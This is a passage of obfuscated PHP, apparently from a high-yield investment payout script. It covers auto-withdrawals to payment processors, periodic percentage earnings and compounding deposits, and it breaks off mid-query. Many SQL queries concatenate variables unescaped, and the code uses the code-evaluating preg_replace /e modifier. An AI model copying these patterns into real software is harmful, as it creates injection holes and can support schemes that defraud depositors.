    $elnlcQBRqn = str_replace ('
', '
', $elnlcQBRqn);
    $elnlcQBRqn = str_replace ('
', '
', $elnlcQBRqn);
    return $elnlcQBRqn;
  }

  function elnlcbtnk ($elnlcQBRqn)
  {
    global $elnlcebOCn;
    $elnlchQNsT = elnlciqxgy ($elnlcQBRqn);
    if (substr ($elnlchQNsT, 0 - strlen ('
')) != '
')
    {
      $elnlchQNsT .= '
';
    }

    return $elnlchQNsT;
  }

  function elnlcufptk ($elnlcQBRqn)
  {
    global $elnlcebOCn;
    $elnlchQNsT = elnlciqxgy ($elnlcQBRqn);
    if (substr ($elnlchQNsT, 0 - strlen ('
')) != '
')
    {
      $elnlchQNsT .= '
';
    }

    $elnlchQNsT = preg_replace ('/([\\000-\\010\\013\\014\\016-\\037\\075\\177-\\377])/e', '\'=\'.sprintf(\'%02X\', ord(\'\\1\'))', $elnlchQNsT);
    $elnlchQNsT = preg_replace ('/([	 ])
/e', '\'=\'.sprintf(\'%02X\', ord(\'\\1\')).\'
\'', $elnlchQNsT);
    $elnlchQNsT = elnlcmpaif ($elnlchQNsT, 74, true);
    return $elnlchQNsT;
  }

  function elnlcmpaif ($elnlclIIyg, $elnlcDwUH, $elnlctbNco = false)
  {
    global $elnlcebOCn;
    $elnlcsNFH = ($elnlctbNco ? sprintf (' =%s', '
') : '
');
    $elnlclIIyg = elnlciqxgy ($elnlclIIyg);
    if (substr ($elnlclIIyg, -1) == '
')
    {
      $elnlclIIyg = substr ($elnlclIIyg, 0, -1);
    }

    $elnlcJPlcC = explode ('
', $elnlclIIyg);
    $elnlclIIyg = '';
    for ($i = 0; $i < count ($elnlcJPlcC); ++$i)
    {
      $elnlcRUVxf = explode (' ', $elnlcJPlcC[$i]);
      $elnlcFwcH = '';
      for ($e = $elnlcebOCn['elnlcMkRzz']; $e < count ($elnlcRUVxf); ++$e)
      {
        $elnlcuVkq = $elnlcRUVxf[$e];
        if (($elnlctbNco AND $elnlcDwUH < strlen ($elnlcuVkq)))
        {
          $elnlcouGi = $elnlcDwUH - strlen ($elnlcFwcH) - 1;
          if ($e != 0)
          {
            if (20 < $elnlcouGi)
            {
              $elnlcHLevI = $elnlcouGi;
              if (substr ($elnlcuVkq, $elnlcHLevI - 1, 1) == '=')
              {
                --$elnlcHLevI;
              }
              else
              {
                if (substr ($elnlcuVkq, $elnlcHLevI - 2, 1) == '=')
                {
                  $elnlcHLevI -= 2;
                }
              }

              $elnlcmNpA = substr ($elnlcuVkq, 0, $elnlcHLevI);
              $elnlcuVkq = substr ($elnlcuVkq, $elnlcHLevI);
              $elnlcFwcH .= ' ' . $elnlcmNpA;
              $elnlclIIyg .= $elnlcFwcH . sprintf ('=%s', '
');
            }
            else
            {
              $elnlclIIyg .= $elnlcFwcH . $elnlcsNFH;
            }

            $elnlcFwcH = '';
          }

          while (0 < strlen ($elnlcuVkq))
          {
            $elnlcHLevI = $elnlcDwUH;
            if (substr ($elnlcuVkq, $elnlcHLevI - 1, 1) == '=')
            {
              --$elnlcHLevI;
            }
            else
            {
              if (substr ($elnlcuVkq, $elnlcHLevI - 2, 1) == '=')
              {
                $elnlcHLevI -= 2;
              }
            }

            $elnlcmNpA = substr ($elnlcuVkq, 0, $elnlcHLevI);
            $elnlcuVkq = substr ($elnlcuVkq, $elnlcHLevI);
            if (0 < strlen ($elnlcuVkq))
            {
              $elnlclIIyg .= $elnlcmNpA . sprintf ('=%s', '
');
              continue;
            }
            else
            {
              $elnlcFwcH = $elnlcmNpA;
              continue;
            }
          }

          continue;
        }

        $elnlcKkfyw = $elnlcFwcH;
        $elnlcFwcH .= ($e == 0 ? $elnlcuVkq : ' ' . $elnlcuVkq);
        if (($elnlcDwUH < strlen ($elnlcFwcH) AND $elnlcKkfyw != ''))
        {
          $elnlclIIyg .= $elnlcKkfyw . $elnlcsNFH;
          $elnlcFwcH = $elnlcuVkq;
          continue;
        }
      }

      $elnlclIIyg .= $elnlcFwcH . '
';
    }

    return $elnlclIIyg;
  }

  function elnlcakmut ($elnlcOzwH = '100%')
  {
    return '' . '
<table cellspacing=0 cellpadding=1 border=0 width=' . $elnlcOzwH . ' bgcolor=#FF8D00>
<tr><td bgcolor=#FF8D00>
<table cellspacing=0 cellpadding=0 border=0 width=100%>
<tr>
<td valign=top width=10 bgcolor=#FFFFF2><img src=images/sign.gif></td>
<td valign=top bgcolor=#FFFFF2 style=\'padding: 10px; color: #D20202; font-family: verdana; font-size: 11px;\'>
';
  }

  function elnlccrdf ()
  {
    return '</td></tr></table></td></tr></table>';
  }

  function elnlcqalmb ($elnlcDRwe, $elnlcdrkS, $elnlcIbBG)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if ($elnlcroEyb[$elnlcebOCn['elnlcyxlp']] == 1)
    {
      return null;
    }

    if ($elnlcroEyb[$elnlcebOCn['elnlcAndWV']] == 1)
    {
      $q = '' . 'select * from hm2_deposits where id = ' . $elnlcDRwe;
      ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
      $elnlcvJQEM = mysql_fetch_array ($elnlcaJzM);
      if (!$elnlcvufT[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]][$elnlcebOCn['elnlcAndj']])
      {
        return null;
      }

      $q = 'select * from hm2_users where id = ' . $elnlcvJQEM[$elnlcebOCn['elnlcREbrh']];
      ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
      $elnlcOgiqh = mysql_fetch_array ($elnlcaJzM);
      if (($elnlcOgiqh[$elnlcebOCn['elnlcrHSpr']] != 1 OR $elnlcOgiqh[$elnlcebOCn['elnlcmzCrW']] != 1))
      {
        return null;
      }

      if (0 < $elnlcroEyb[$elnlcebOCn['elnlcAyhJB']])
      {
        $q = 'select sum(actual_amount*(type = \'add_funds\')) as td, sum(actual_amount*(type = \'withdrawal\')) as tw from hm2_history where type in (\'add_funds\', \'withdrawal\')';
        ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
        $elnlcMuwB = mysql_fetch_array ($elnlcaJzM);
        if (0 < $elnlcMuwB[$elnlcebOCn['elnlcEBbHg']])
        {
          if ($elnlcroEyb[$elnlcebOCn['elnlcAyhJB']] <= ($elnlcMuwB[$elnlcebOCn['elnlcHlkxj']] + $elnlcdrkS) * 100 / $elnlcMuwB[$elnlcebOCn['elnlcEBbHg']])
          {
            return null;
          }
        }
      }

      $elnlcqVxEu = unserialize ($elnlcOgiqh[$elnlcebOCn['elnlcNexW']]);
      $elnlcdrkS = abs ($elnlcdrkS);
      $elnlcuSNi = floor ($elnlcdrkS * $elnlcroEyb[$elnlcebOCn['elnlcGLkz']]) / 100;
      if ($elnlcuSNi < $elnlcroEyb[$elnlcebOCn['elnlcFsCEs']])
      {
        $elnlcuSNi = $elnlcroEyb[$elnlcebOCn['elnlcFsCEs']];
      }

      $elnlcCekc = $elnlcdrkS - $elnlcuSNi;
      if ($elnlcCekc < 0)
      {
        $elnlcCekc = $elnlcebOCn['elnlcMkRzz'];
      }

      $elnlcCekc = sprintf ('%.02f', floor ($elnlcCekc * 100) / 100);
      if ($elnlcroEyb[$elnlcebOCn['elnlczKCn']] != '')
      {
        $elnlcTerUu = '' . 'Earning from deposit $' . $elnlcvJQEM[$elnlcebOCn['elnlcdIzRV']] . '. Auto withdraw to ' . $elnlcOgiqh[$elnlcebOCn['elnlcAsniz']] . ' from ' . $elnlcroEyb[$elnlcebOCn['elnlcDBNH']];
      }
      else
      {
        $elnlcTerUu = $elnlcroEyb[$elnlcebOCn['elnlczKCn']];
      }

      $elnlcSquPB = '' . 'Auto-withdrawal error, tried to send ' . $elnlcCekc . ' earning to ' . $elnlcvufT[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]][$elnlcebOCn['elnlcfCuqi']] . ' account # ' . $elnlcqVxEu[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]] . '. Error:';
      if ($elnlcvJQEM[$elnlcebOCn['elnlcuNubW']] == 0)
      {
        list ($elnlcOozF, $elnlcgVavt, $elnlcTTklA) = elnlcrlgh ('', $elnlcCekc, $elnlcqVxEu[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]], $elnlcTerUu, $elnlcSquPB);
      }

      if ($elnlcvJQEM[$elnlcebOCn['elnlcuNubW']] == 1)
      {
        list ($elnlcOozF, $elnlcgVavt, $elnlcTTklA) = elnlckwszc ('', $elnlcCekc, $elnlcqVxEu[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]], $elnlcTerUu, $elnlcSquPB);
      }

      if ($elnlcvJQEM[$elnlcebOCn['elnlcuNubW']] == 2)
      {
        list ($elnlcOozF, $elnlcgVavt, $elnlcTTklA) = elnlcvopx ('', $elnlcCekc, $elnlcqVxEu[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]], $elnlcTerUu, $elnlcSquPB);
      }

      if ($elnlcvJQEM[$elnlcebOCn['elnlcuNubW']] == 5)
      {
        list ($elnlcOozF, $elnlcgVavt, $elnlcTTklA) = elnlckwvf ('', $elnlcCekc, $elnlcqVxEu[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]], $elnlcTerUu, $elnlcSquPB);
      }

      if ($elnlcvJQEM[$elnlcebOCn['elnlcuNubW']] == 8)
      {
        list ($elnlcOozF, $elnlcgVavt, $elnlcTTklA) = elnlcrynb ('', $elnlcCekc, $elnlcqVxEu[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]], $elnlcTerUu, $elnlcSquPB);
      }

      if ($elnlcvJQEM[$elnlcebOCn['elnlcuNubW']] == 9)
      {
        list ($elnlcOozF, $elnlcgVavt, $elnlcTTklA) = elnlcpwvmo ('', $elnlcCekc, $elnlcqVxEu[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]], $elnlcTerUu, $elnlcSquPB);
      }

      if ($elnlcvJQEM[$elnlcebOCn['elnlcuNubW']] == 15)
      {
        list ($elnlcOozF, $elnlcgVavt, $elnlcTTklA) = elnlcfksls ('', $elnlcCekc, $elnlcqVxEu[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]], $elnlcTerUu, $elnlcSquPB);
      }

      if ($elnlcvJQEM[$elnlcebOCn['elnlcuNubW']] == 16)
      {
        list ($elnlcOozF, $elnlcgVavt, $elnlcTTklA) = elnlctaia ('', $elnlcCekc, $elnlcqVxEu[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]], $elnlcTerUu, $elnlcSquPB);
      }

      if ($elnlcvJQEM[$elnlcebOCn['elnlcuNubW']] == 17)
      {
        list ($elnlcOozF, $elnlcgVavt, $elnlcTTklA) = elnlcqkke ('', $elnlcCekc, $elnlcqVxEu[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]], $elnlcTerUu, $elnlcSquPB);
      }

      if ($elnlcvJQEM[$elnlcebOCn['elnlcuNubW']] == 18)
      {
        list ($elnlcOozF, $elnlcgVavt, $elnlcTTklA) = elnlcfokfi ('', $elnlcCekc, $elnlcqVxEu[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]], $elnlcTerUu, $elnlcSquPB);
      }

      if ($elnlcvJQEM[$elnlcebOCn['elnlcuNubW']] == 24)
      {
        list ($elnlcOozF, $elnlcgVavt, $elnlcTTklA) = elnlcautke ('', $elnlcCekc, $elnlcqVxEu[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]], $elnlcTerUu, $elnlcSquPB);
      }

      if ($elnlcOozF == 1)
      {
        $q = 'insert into hm2_history set
            user_id = ' . $elnlcOgiqh[$elnlcebOCn['elnlcdfxo']] . ('' . ',
        		amount = -' . $elnlcdrkS . ',
            		actual_amount = -' . $elnlcdrkS . ',
        		type=\'withdrawal\',
            		' . $elnlcIbBG . ',
			ec = ') . $elnlcvJQEM[$elnlcebOCn['elnlcuNubW']] . ',
        		description = \'Auto-withdrawal earning to account ' . $elnlcqVxEu[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]] . ('' . '. Batch is ' . $elnlcTTklA . '\'');
        (mysql_query ($q) OR print mysql_error ());
        $elnlcKCwJ = array ();
        $elnlcKCwJ[$elnlcebOCn['elnlcAsniz']] = $elnlcOgiqh[$elnlcebOCn['elnlcAsniz']];
        $elnlcKCwJ[$elnlcebOCn['elnlcfCuqi']] = $elnlcOgiqh[$elnlcebOCn['elnlcfCuqi']];
        $elnlcKCwJ[$elnlcebOCn['elnlcBfAt']] = $elnlcdrkS;
        $elnlcKCwJ[$elnlcebOCn['elnlcjpTJ']] = $elnlcTTklA;
        $elnlcKCwJ[$elnlcebOCn['elnlchDAbD']] = $elnlcqVxEu[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]];
        $elnlcKCwJ[$elnlcebOCn['elnlcjbPh']] = $elnlcvufT[$elnlcvJQEM[$elnlcebOCn['elnlcuNubW']]][$elnlcebOCn['elnlcfCuqi']];
        elnlcfdrqh ('withdraw_user_notification', $elnlcOgiqh[$elnlcebOCn['elnlcvtJI']], $elnlcroEyb[$elnlcebOCn['elnlcOEEx']], $elnlcKCwJ);
        elnlcfdrqh ('withdraw_admin_notification', $elnlcroEyb[$elnlcebOCn['elnlcOEEx']], $elnlcroEyb[$elnlcebOCn['elnlcOEEx']], $elnlcKCwJ);
      }
    }

  }

  function elnlcexwt ($elnlcfbyH)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    $elnlcdqPPA = array ();
    if (($elnlcroEyb[$elnlcebOCn['elnlcueEm']] == 1 AND $elnlcfbyH != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
    while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
    {
      $elnlcdqPPA[$elnlcMuwB[$elnlcebOCn['elnlcomxrc']]][$elnlcMuwB[$elnlcebOCn['elnlcdfxo']]] = $elnlcMuwB;
    }

    $elnlcRHhI = $elnlcebOCn['elnlciREG'];
    $elnlciBVQW = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcfbyH == -1)
    {
      $elnlciBVQW = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcfbyH . ' and status = \'on\'';
    }

    if ($elnlcfbyH == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlcLvIi = mysql_query ($q) OR print mysql_error ());
    while ($elnlcnHamw = mysql_fetch_array ($elnlcLvIi))
    {
      $elnlczfrLe = $elnlcnHamw[$elnlcebOCn['elnlcdfxo']];
      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlczfrLe;
      (mysql_query ($q) OR print mysql_error ());
      $elnlcRHhI = $elnlcebOCn['elnlciREG'];
      $elnlcfUBS = ' ((t.work_week = 1)*(floor(q_days / 5) * 7 + q_days % 5 + ((q_days % 5 + WEEKDAY(deposit_date)) > 5)*2 - 1) + (t.work_week = 0)*(t.q_days)) ';
      while (0 < $elnlcRHhI)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              t.return_profit as return_profit,
              ' . $elnlcfUBS . ' as q_days1
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlczfrLe . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              (((' . $elnlcfUBS . ' + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = \'h\', 60*60, 60*60*24))) or ' . $elnlcfUBS . ' = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval ' . $elnlcfUBS . ' + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((' . $elnlcfUBS . ' = 0) or 
                (               
                (d.deposit_date + interval ' . $elnlcfUBS . ' + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = \'h\') or
                (d.deposit_date + interval ' . $elnlcfUBS . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = \'d\') or
                (d.deposit_date + interval ' . $elnlcfUBS . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval ' . $elnlcfUBS . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval ' . $elnlcfUBS . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval ' . $elnlcfUBS . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval ' . $elnlcfUBS . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval ' . $elnlcfUBS . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval ' . $elnlcfUBS . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (' . $elnlcfUBS . ' > 0 and t.period = \'end\') 
              ))';
        ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
        $elnlcRHhI = $elnlcebOCn['elnlcMkRzz'];
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          ++$elnlcRHhI;
          if (!isset ($elnlcdqPPA[$elnlcMuwB[$elnlcebOCn['elnlcPPdPx']]]))
          {
            continue;
          }

          $elnlcGRpDe = $elnlcebOCn['elnlcMkRzz'];
          $elnlcdoNrO = $elnlcebOCn['elnlcMkRzz'];
          reset ($elnlcdqPPA);
          reset ($elnlcdqPPA[$elnlcMuwB[$elnlcebOCn['elnlcPPdPx']]]);
          while (list ($elnlceUGI, $elnlcSMRUm) = each ($elnlcdqPPA[$elnlcMuwB[$elnlcebOCn['elnlcPPdPx']]]))
          {
            if (($elnlcSMRUm[$elnlcebOCn['elnlcSTGg']] <= $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] AND ($elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] <= $elnlcSMRUm[$elnlcebOCn['elnlcStkL']] OR $elnlcSMRUm[$elnlcebOCn['elnlcStkL']] == 0)))
            {
              $elnlcGRpDe = $elnlcSMRUm[$elnlcebOCn['elnlclWRL']];
            }

            if (($elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] < $elnlcSMRUm[$elnlcebOCn['elnlcSTGg']] AND $elnlcGRpDe == 0))
            {
              $elnlcGRpDe = $elnlcdoNrO;
            }

            if (($elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] < $elnlcSMRUm[$elnlcebOCn['elnlcSTGg']] AND 0 < $elnlcGRpDe))
            {
              break;
            }

            $elnlcdoNrO = $elnlcSMRUm[$elnlcebOCn['elnlclWRL']];
          }

          if (($elnlcSMRUm[$elnlcebOCn['elnlcStkL']] != 0 AND $elnlcSMRUm[$elnlcebOCn['elnlcStkL']] < $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']]))
          {
            $elnlcGRpDe = $elnlcdoNrO;
          }

          $elnlctAAR = $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] * $elnlcGRpDe / 100;
          $elnlcJBjo = '';
          if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcdcUM'])
          {
            $elnlcJBjo = ' 1 day ';
          }
          else
          {
            if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'])
            {
              $elnlcJBjo = ' 1 hour ';
            }
            else
            {
              if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcOjqv'])
              {
                $elnlcJBjo = ' 7 day ';
              }
              else
              {
                if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == 'b-w')
                {
                  $elnlcJBjo = ' 14 day ';
                }
                else
                {
                  if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcndCCA'])
                  {
                    $elnlcJBjo = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcUJuca'])
                    {
                      $elnlcJBjo = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcmKFT'])
                      {
                        $elnlcJBjo = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcwVAV'])
                        {
                          $elnlcJBjo = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlccnjUF'])
                          {
                            $elnlcJBjo = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcOWeSR'])
                            {
                              $elnlcJBjo = ' ' . $elnlcMuwB[$elnlcebOCn['elnlcJnlR']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcGRpDe == 0 AND $elnlcJBjo == ''))
          {
            continue;
          }

          $elnlcbJRz = -1;
          $q = 'select weekday(\'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ') as dw');
          ($elnlcDTsPf = mysql_query ($q) OR print mysql_error ());
          while ($elnlcgKLwu = mysql_fetch_array ($elnlcDTsPf))
          {
            $elnlcbJRz = $elnlcgKLwu[$elnlcebOCn['elnlckWIE']];
          }

          $q = 'select count(id) as col from hm2_history where ' . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? ' date_format(date, \'%Y-%m-%d %H\') = date_format(\'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ', \'%Y-%m-%d %H\') and') : 'to_days(date) = to_days(\'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ') and ')) . ' deposit_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
          ($elnlcLxDNR = mysql_query ($q) OR print mysql_error ());
          $elnlcNSMEL = $elnlcebOCn['elnlcMkRzz'];
          while ($elnlciJMKa = mysql_fetch_array ($elnlcLxDNR))
          {
            $elnlcNSMEL = $elnlciJMKa[$elnlcebOCn['elnlclbIq']];
          }

          if ($elnlcNSMEL == 0)
          {
            if ((5 <= $elnlcbJRz AND $elnlcMuwB[$elnlcebOCn['elnlcQulec']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcbJRz == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ',
                    ec = ') . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ('' . ',
                    amount = ' . $elnlctAAR . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcroEyb[$elnlcebOCn['elnlcDOlB']] . number_format ($elnlcMuwB[$elnlcebOCn['elnlcdIzRV']], 2) . ('' . ' - ' . $elnlcGRpDe . ' %\',
                    actual_amount = ' . $elnlctAAR . ',
                    date = \'') . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ',
                    ec = ') . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
            }

            (mysql_query ($q) OR print mysql_error ());
          }

          $elnlcONjR = '';
          if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcOWeSR'])
          {
            if (($elnlcMuwB[$elnlcebOCn['elnlcJGsj']] == 0 OR ($elnlcMuwB[$elnlcebOCn['elnlcJGsj']] AND $elnlcMuwB[$elnlcebOCn['elnlcksWM']])))
            {
              $elnlcONjR = ', status = \'off\'';
            }

            if (($elnlcMuwB[$elnlcebOCn['elnlcECdHB']] == 1 AND ($elnlcMuwB[$elnlcebOCn['elnlcJGsj']] == 0 OR ($elnlcMuwB[$elnlcebOCn['elnlcJGsj']] AND $elnlcMuwB[$elnlcebOCn['elnlcksWM']]))))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ',
                    amount = ' . $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] . ',
                    ec = ' . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . ',
                    date = \'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ',
                    deposit_id = ') . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
              (mysql_query ($q) OR print mysql_error ());
            }
          }
          else
          {
            if ((5 <= $elnlcbJRz AND $elnlcMuwB[$elnlcebOCn['elnlcQulec']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] AND $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] <= 100) AND $elnlcMuwB[$elnlcebOCn['elnlcNPfGR']] == 1))
              {
                if ($elnlcMuwB[$elnlcebOCn['elnlcRtrt']] == 0)
                {
                  $elnlcMuwB[$elnlcebOCn['elnlcRtrt']] = $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] + 1;
                }

                if (($elnlcMuwB[$elnlcebOCn['elnlclvlF']] <= $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] AND $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] <= $elnlcMuwB[$elnlcebOCn['elnlcRtrt']]))
                {
                  if ($elnlcMuwB[$elnlcebOCn['elnlcmoxNv']] == 1)
                  {
                    $elnlcAmNI = preg_split ('/\\s*,\\s*/', $elnlcMuwB[$elnlcebOCn['elnlcnhPg']]);
                    if (!in_array ($elnlcMuwB[$elnlcebOCn['elnlcKAJw']], $elnlcAmNI))
                    {
                      $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] = $elnlcAmNI[0];
                    }
                  }
                  else
                  {
                    if ($elnlcMuwB[$elnlcebOCn['elnlcKAJw']] < $elnlcMuwB[$elnlcebOCn['elnlcUSya']])
                    {
                      $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] = $elnlcMuwB[$elnlcebOCn['elnlcUSya']];
                    }

                    if ($elnlcMuwB[$elnlcebOCn['elnlcmVtNR']] < $elnlcMuwB[$elnlcebOCn['elnlcKAJw']])
                    {
                      $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] = $elnlcMuwB[$elnlcebOCn['elnlcmVtNR']];
                    }
                  }
                }
                else
                {
                  $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] = $elnlcebOCn['elnlcMkRzz'];
                }

                if ((0 < $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] AND $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] <= 100))
                {
                  $elnlcajRvg = $elnlctAAR * $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] / 100;
                  $elnlctAAR = floor ((floor ($elnlctAAR * 100000) / 100000 - floor ($elnlcajRvg * 100000) / 100000) * 100) / 100;
                  $q = 'insert into hm2_history set user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ('' . ',
                        amount = -' . $elnlcajRvg . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlcajRvg . ',
                    		ec = ') . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . ',
                    		date = \'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ',
                                deposit_id = ') . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlcajRvg . ',
